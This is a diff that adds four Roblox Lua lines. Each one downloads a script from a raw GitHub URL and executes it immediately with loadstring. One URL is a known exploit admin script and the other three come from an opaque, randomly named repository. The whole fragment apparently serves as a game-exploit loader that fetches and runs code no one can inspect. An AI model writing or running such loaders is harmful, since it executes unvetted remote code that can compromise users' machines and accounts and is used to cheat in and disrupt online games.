@@ -1,0 +1,4 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/serhsehrshvs/23r23/main/23'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/serhsehrshvs/23r23/main/awge'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/serhsehrshvs/23r23/main/rw'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
